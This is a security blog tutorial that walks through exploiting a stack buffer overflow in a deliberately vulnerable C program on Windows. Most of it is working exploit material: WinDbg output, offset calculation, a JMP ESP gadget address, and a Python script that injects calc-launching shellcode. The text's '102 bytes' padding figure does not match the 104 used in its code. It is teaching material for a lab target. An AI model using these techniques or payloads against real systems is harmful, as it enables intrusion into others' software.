<!DOCTYPE html>
<html lang="en">
<head>
  	<meta charset="utf-8">
  	<title>Dimitri Fourny | How detect and exploit a buffer overflow</title>
  	<meta name="viewport" content="width=device-width, initial-scale=1.0">
  	<meta name="description" content="Passionate security researcher.">
  	<meta name="author" content="Dimitri Fourny">
	
	<link href="/css/bootstrap.min.css" rel="stylesheet">
    <link href="/css/style.css" rel="stylesheet">
  	<link href="/css/syntax.css" rel="stylesheet">

    <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
  	<link rel="shortcut icon" href="/img/favicon.png">
</head>

<body>
	<div class="navbar navbar-default navbar-static-top" role="navigation">
		<div class="container">
			<div class="navbar-header">
				<a class="navbar-brand" href="/">Dimitri Fourny</a>
	          	<button class="navbar-toggle" type="button" data-toggle="collapse" data-target="#navbar-main">
	            	<span class="icon-bar"></span>
	            	<span class="icon-bar"></span>
	            	<span class="icon-bar"></span>
	          	</button>
		    </div>

		    <div class="navbar-collapse collapse" id="navbar-main">
		      <ul class="nav navbar-nav navbar-right">
                <li class="active"><a href="/">Home</a></li>
		        <li><a href="https://twitter.com/DimitriFourny">Twitter</a></li>
		        <li><a href="http://fr.linkedin.com/pub/dimitri-fourny/58/283/13a/">Linkedin</a></li>
		        <li><a href="/feed.xml">RSS</a></li>
		      </ul>
		    </div>
		</div>
	</div>

	<div class="container">
		
		<div class="row">
			<div class="col-sm-12">
				<h1 id="how-detect-and-exploit-a-buffer-overflow">How detect and exploit a buffer overflow</h1>

<h2 id="introduction">Introduction</h2>

<p>The buffer overflow is the most classical vulnerability, on Linux and on Windows.<br />
In this article, I will try to show you how exploit a buffer overflow on Windows with WinDbg and a little Python code.</p>

<h2 id="etablishment">Etablishment</h2>

<figure class="highlight"><pre><code class="language-cpp" data-lang="cpp"><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
	<span class="kt">char</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>

	<span class="n">getchar</span><span class="p">()</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"argv[1]: %s"</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>

	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>If you want to compile it with Visual Studio, don’t forget to deactivate some protections, <em>Project -&gt; Properties</em> puis:</p>

<ul>
  <li>Stack cookie: <strong>C/C++ -&gt; Code generation -&gt; Buffer Security Check</strong> = No</li>
  <li>ASLR: <strong>Linker -&gt; Advanced -&gt; Randomized Base Address</strong> = No</li>
  <li>DEP: <strong>Linker -&gt; Advanced -&gt; Data Execution Protection</strong> = No</li>
</ul>

<p>And compile with <strong>Release</strong> mode.</p>

<h2 id="exploitation">Exploitation</h2>

<p>We will test <code>argv[1]</code> entry:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span> 
<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span><span class="s">'A'</span><span class="o">*</span><span class="mi">200</span><span class="p">);</span></code></pre></figure>

<p>We start our Python script, WinDbg and we do <em>File -&gt; Attach to a Process…</em>.
We continue the script execution and:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">(</span><span class="mi">598</span><span class="p">.</span><span class="mi">11</span><span class="n">cc</span><span class="p">)</span><span class="o">:</span> <span class="n">Access</span> <span class="n">violation</span> <span class="o">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="k">and</span> <span class="n">handled</span><span class="p">.</span>
<span class="mi">41414141</span> <span class="o">??</span>              <span class="o">???</span></code></pre></figure>

<p>Boom! We could control EIP!<br />
We check:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">r</span>
<span class="n">eax</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ebx</span><span class="o">=</span><span class="mi">00000000</span> <span class="n">ecx</span><span class="o">=</span><span class="mi">72</span><span class="n">e75617</span> <span class="n">edx</span><span class="o">=</span><span class="mi">0008</span><span class="n">e3b8</span> <span class="n">esi</span><span class="o">=</span><span class="mi">00000001</span> <span class="n">edi</span><span class="o">=</span><span class="mi">00403378</span>
<span class="n">eip</span><span class="o">=</span><span class="mi">41414141</span> <span class="n">esp</span><span class="o">=</span><span class="mi">0018</span><span class="n">ff4c</span> <span class="n">ebp</span><span class="o">=</span><span class="mi">41414141</span> <span class="n">iopl</span><span class="o">=</span><span class="mi">0</span>         <span class="n">nv</span> <span class="n">up</span> <span class="n">ei</span> <span class="n">pl</span> <span class="n">zr</span> <span class="n">na</span> <span class="n">pe</span> <span class="n">nc</span>
<span class="n">cs</span><span class="o">=</span><span class="mi">0023</span>  <span class="n">ss</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">ds</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">es</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>  <span class="n">fs</span><span class="o">=</span><span class="mi">0053</span>  <span class="n">gs</span><span class="o">=</span><span class="mi">002</span><span class="n">b</span>             <span class="n">efl</span><span class="o">=</span><span class="mi">00010246</span></code></pre></figure>

<p>0x41 is ‘A’ in ASCII code, so we can control the execution address and execute our shellcode.<br />
We looking the stack to know how much <em>A</em> we need to remove:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="kt">dd</span> <span class="n">esp</span>
<span class="mi">0018</span><span class="n">ff4c</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">0018</span><span class="n">ff5c</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">0018</span><span class="n">ff6c</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">0018</span><span class="n">ff7c</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">0018</span><span class="n">ff8c</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span>
<span class="mi">0018</span><span class="n">ff9c</span>  <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">41414141</span> <span class="mi">00000000</span>
<span class="mi">0018</span><span class="n">ffac</span>  <span class="mi">7</span><span class="n">efde000</span> <span class="mi">00000000</span> <span class="mi">00000000</span> <span class="mi">00000000</span>
<span class="mi">0018</span><span class="n">ffbc</span>  <span class="mi">0018</span><span class="n">ffa0</span> <span class="mi">00000000</span> <span class="n">ffffffff</span> <span class="mi">775470</span><span class="n">d5</span></code></pre></figure>

<p>We change our Python script and we test once again:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="o">?</span> <span class="mi">0018</span><span class="n">ffac</span> <span class="o">-</span> <span class="mi">4</span> <span class="o">-</span> <span class="mi">0018</span><span class="n">ff4c</span>
<span class="n">Evaluate</span> <span class="n">expression</span><span class="o">:</span> <span class="mi">92</span> <span class="o">=</span> <span class="mi">0000005</span><span class="n">c</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span> 
<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span><span class="s">'A'</span><span class="o">*</span><span class="mi">104</span><span class="o">+</span><span class="s">'B'</span><span class="o">*</span><span class="mi">4</span><span class="p">);</span></code></pre></figure>

<p>And execute it:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="p">(</span><span class="n">e70</span><span class="p">.</span><span class="mi">868</span><span class="p">)</span><span class="o">:</span> <span class="n">Access</span> <span class="n">violation</span> <span class="o">-</span> <span class="n">code</span> <span class="n">c0000005</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="k">and</span> <span class="n">handled</span><span class="p">.</span>
<span class="mi">42424242</span> <span class="o">??</span>              <span class="o">???</span></code></pre></figure>

<p>We need a 102 bytes padding, followed by the shellcode address and finally the shellcode!<br />
But we have a problem: the shellcode will contain a null byte !<br />
In fact, if we want to do it:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span> 

<span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="mi">104</span> <span class="c"># NOP</span>
<span class="n">eip</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x4c\xff\x18\x00</span><span class="s">'</span> <span class="c"># 0018ff4c</span>

<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">eip</span><span class="p">);</span></code></pre></figure>

<p>We see that <em>eip</em> wil contain a null byte and the shellcode will not work.
So we will use the technique of <em>JMP ESP</em>.</p>

<h2 id="jmp-esp">JMP ESP</h2>

<p>We need to find a <em>JMP ESP</em> avec <a href="http://godr.altervista.org/index.php?mod=Download">findjmp2</a>.<br />
We dump the list modules:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">00400000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">00405000</span>   <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Dimitri</span><span class="err">\</span><span class="n">Desktop</span><span class="err">\</span><span class="n">bof</span><span class="p">.</span><span class="n">exe</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">772</span><span class="n">f0000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">7749</span><span class="n">c000</span>   <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">SYSTEM32</span><span class="err">\</span><span class="n">ntdll</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">774</span><span class="n">d0000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">77650000</span>   <span class="n">ntdll</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">74</span><span class="n">fd0000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">7500</span><span class="n">f000</span>   <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">SYSTEM32</span><span class="err">\</span><span class="n">wow64</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">74</span><span class="n">f70000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">74</span><span class="n">fcc000</span>   <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">SYSTEM32</span><span class="err">\</span><span class="n">wow64win</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">74</span><span class="n">f60000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">74</span><span class="n">f68000</span>   <span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Windows</span><span class="err">\</span><span class="n">SYSTEM32</span><span class="err">\</span><span class="n">wow64cpu</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">75</span><span class="n">c10000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">75</span><span class="n">d20000</span>   <span class="n">KERNEL32</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">76080000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">760</span><span class="n">c7000</span>   <span class="n">KERNELBASE</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">73860000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">7391</span><span class="n">f000</span>   <span class="n">MSVCR100</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">10000000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">1005</span><span class="n">a000</span>   <span class="n">guard32</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">752</span><span class="n">d0000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">753</span><span class="n">d0000</span>   <span class="n">USER32</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">75570000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">75600000</span>   <span class="n">GDI32</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">75530000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">7553</span><span class="n">a000</span>   <span class="n">LPK</span><span class="p">.</span><span class="n">dll</span> 
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">75630000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">756</span><span class="n">cd000</span>   <span class="n">USP10</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">757</span><span class="n">c0000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">7586</span><span class="n">c000</span>   <span class="n">msvcrt</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">77030000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">770</span><span class="n">d0000</span>   <span class="n">ADVAPI32</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">752</span><span class="n">b0000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">752</span><span class="n">c9000</span>   <span class="n">SECHOST</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">756</span><span class="n">d0000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">757</span><span class="n">c0000</span>   <span class="n">RPCRT4</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">75030000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">75090000</span>   <span class="n">SspiCli</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">75020000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">7502</span><span class="n">c000</span>   <span class="n">CRYPTBASE</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">74</span><span class="n">f50000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">74</span><span class="n">f59000</span>   <span class="n">VERSION</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">76</span><span class="n">f10000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">76</span><span class="n">f70000</span>   <span class="n">IMM32</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">751</span><span class="n">e0000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">752</span><span class="n">ac000</span>   <span class="n">MSCTF</span><span class="p">.</span><span class="n">dll</span>
<span class="n">ModLoad</span><span class="o">:</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">74</span><span class="n">ee0000</span> <span class="mi">00000000</span><span class="err">`</span><span class="mi">74</span><span class="n">ee7000</span>   <span class="n">FLTLIB</span><span class="p">.</span><span class="n">DLL</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="n">C</span><span class="o">:</span><span class="err">\</span><span class="n">Users</span><span class="err">\</span><span class="n">Dimitri</span><span class="err">\</span><span class="n">Desktop</span><span class="o">&gt;</span><span class="n">findjmp</span><span class="p">.</span><span class="n">exe</span> <span class="n">KERNEL32</span><span class="p">.</span><span class="n">dll</span> <span class="n">esp</span>

<span class="n">Findjmp</span><span class="p">,</span> <span class="n">Eeye</span><span class="p">,</span> <span class="n">I2S</span><span class="o">-</span><span class="n">LaB</span>
<span class="n">Findjmp2</span><span class="p">,</span> <span class="n">Hat</span><span class="o">-</span><span class="n">Squad</span>
<span class="n">Scanning</span> <span class="n">KERNEL32</span><span class="p">.</span><span class="n">dll</span> <span class="n">for</span> <span class="n">code</span> <span class="n">useable</span> <span class="n">with</span> <span class="n">the</span> <span class="n">esp</span> <span class="n">register</span>
<span class="mh">0x75C32EA9</span>      <span class="k">push</span> <span class="n">esp</span> <span class="o">-</span> <span class="k">ret</span>
<span class="mh">0x75C32EB1</span>      <span class="k">push</span> <span class="n">esp</span> <span class="o">-</span> <span class="k">ret</span>
<span class="mh">0x75C32EB9</span>      <span class="k">push</span> <span class="n">esp</span> <span class="o">-</span> <span class="k">ret</span>
<span class="mh">0x75C32EC1</span>      <span class="k">push</span> <span class="n">esp</span> <span class="o">-</span> <span class="k">ret</span>
<span class="mh">0x75C32EC9</span>      <span class="k">push</span> <span class="n">esp</span> <span class="o">-</span> <span class="k">ret</span>
<span class="mh">0x75C32ED1</span>      <span class="k">push</span> <span class="n">esp</span> <span class="o">-</span> <span class="k">ret</span>
<span class="mh">0x75C32ED9</span>      <span class="k">push</span> <span class="n">esp</span> <span class="o">-</span> <span class="k">ret</span>
<span class="mh">0x75C32EE1</span>      <span class="k">push</span> <span class="n">esp</span> <span class="o">-</span> <span class="k">ret</span>
<span class="mh">0x75C32EE9</span>      <span class="k">push</span> <span class="n">esp</span> <span class="o">-</span> <span class="k">ret</span>
<span class="mh">0x75C32EF1</span>      <span class="k">push</span> <span class="n">esp</span> <span class="o">-</span> <span class="k">ret</span>
<span class="mh">0x75C3EF93</span>      <span class="k">call</span> <span class="n">esp</span>
<span class="mh">0x75C40405</span>      <span class="k">jmp</span> <span class="n">esp</span>
<span class="mh">0x75C493A3</span>      <span class="k">call</span> <span class="n">esp</span>
<span class="mh">0x75C9D26F</span>      <span class="k">call</span> <span class="n">esp</span>
<span class="n">Finished</span> <span class="n">Scanning</span> <span class="n">KERNEL32</span><span class="p">.</span><span class="n">dll</span> <span class="n">for</span> <span class="n">code</span> <span class="n">useable</span> <span class="n">with</span> <span class="n">the</span> <span class="n">esp</span> <span class="n">register</span>
<span class="n">Found</span> <span class="mi">14</span> <span class="n">usable</span> <span class="n">addresses</span></code></pre></figure>

<p>So we can choose a gadget and try:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span> 

<span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="mi">104</span> <span class="c"># NOP</span>
<span class="n">jmpESP</span> <span class="o">=</span> <span class="s">'</span><span class="se">\xA9\x2E\xC3\x75</span><span class="s">'</span> <span class="c"># *75C32EA9 = jmp esp</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="s">'</span><span class="se">\xCC</span><span class="s">'</span><span class="o">*</span><span class="mi">4</span> <span class="c"># INT 3</span>

<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">jmpESP</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">);</span></code></pre></figure>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">0</span><span class="o">:</span><span class="mi">001</span><span class="o">&gt;</span> <span class="n">g</span>
<span class="p">(</span><span class="mi">1378</span><span class="p">.</span><span class="mi">10</span><span class="n">f0</span><span class="p">)</span><span class="o">:</span> <span class="n">WOW64</span> <span class="n">breakpoint</span> <span class="o">-</span> <span class="n">code</span> <span class="mi">4000001</span><span class="n">f</span> <span class="p">(</span><span class="n">first</span> <span class="n">chance</span><span class="p">)</span>
<span class="n">First</span> <span class="n">chance</span> <span class="n">exceptions</span> <span class="n">are</span> <span class="n">reported</span> <span class="n">before</span> <span class="n">any</span> <span class="n">exception</span> <span class="n">handling</span><span class="p">.</span>
<span class="n">This</span> <span class="n">exception</span> <span class="n">may</span> <span class="n">be</span> <span class="n">expected</span> <span class="k">and</span> <span class="n">handled</span><span class="p">.</span>
<span class="mi">0018</span><span class="n">ff4c</span> <span class="n">cc</span>              <span class="k">int</span>     <span class="mi">3</span>

<span class="mi">0</span><span class="o">:</span><span class="mi">000</span><span class="o">:</span><span class="n">x86</span><span class="o">&gt;</span> <span class="n">u</span>
<span class="mi">0018</span><span class="n">ff4c</span> <span class="n">cc</span>              <span class="k">int</span>     <span class="mi">3</span>
<span class="mi">0018</span><span class="n">ff4d</span> <span class="n">cc</span>              <span class="k">int</span>     <span class="mi">3</span>
<span class="mi">0018</span><span class="n">ff4e</span> <span class="n">cc</span>              <span class="k">int</span>     <span class="mi">3</span>
<span class="mi">0018</span><span class="n">ff4f</span> <span class="n">cc</span>              <span class="k">int</span>     <span class="mi">3</span>
<span class="mi">0018</span><span class="n">ff50</span> <span class="mi">002</span><span class="n">d5000501b</span>    <span class="k">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="n">ds</span><span class="o">:</span><span class="p">[1B500050h],</span><span class="n">ch</span>
<span class="mi">0018</span><span class="n">ff56</span> <span class="mi">50</span>              <span class="k">push</span>    <span class="n">eax</span>
<span class="mi">0018</span><span class="n">ff57</span> <span class="mi">00</span><span class="n">bd1cf87000</span>    <span class="k">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="err">[</span><span class="n">ebp</span><span class="o">+</span><span class="mi">70</span><span class="n">F81Ch</span><span class="err">]</span><span class="p">,</span><span class="n">bh</span>
<span class="mi">0018</span><span class="n">ff5d</span> <span class="mi">0000</span>            <span class="k">add</span>     <span class="n">byte</span> <span class="n">ptr</span> <span class="p">[eax],</span><span class="n">al</span></code></pre></figure>

<p>A small shellcode to test:</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">os</span> 

<span class="n">padding</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span><span class="o">*</span><span class="mi">104</span> <span class="c"># NOP</span>
<span class="n">jmpESP</span> <span class="o">=</span> <span class="s">'</span><span class="se">\xA9\x2E\xC3\x75</span><span class="s">'</span> <span class="c"># *75C32EA9 = jmp esp</span>

<span class="c"># http://code.google.com/p/w32-exec-calc-shellcode/</span>
<span class="n">shellcode</span> <span class="o">=</span>	<span class="p">(</span><span class="s">"</span><span class="se">\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72\x30</span><span class="s">"</span>
			<span class="s">"</span><span class="se">\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B</span><span class="s">"</span>
			<span class="s">"</span><span class="se">\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x0F</span><span class="s">"</span>
			<span class="s">"</span><span class="se">\xB7\x2C\x51\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF1\x8B\x74</span><span class="s">"</span>
			<span class="s">"</span><span class="se">\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7\xCC</span><span class="s">"</span><span class="p">);</span>

<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">'bof.exe '</span><span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">jmpESP</span> <span class="o">+</span><span class="s">'"'</span><span class="o">+</span><span class="n">shellcode</span><span class="o">+</span><span class="s">'"'</span><span class="p">);</span></code></pre></figure>

<p>Done !</p>

			</div>
		</div>

    </div>

</body>
</html>
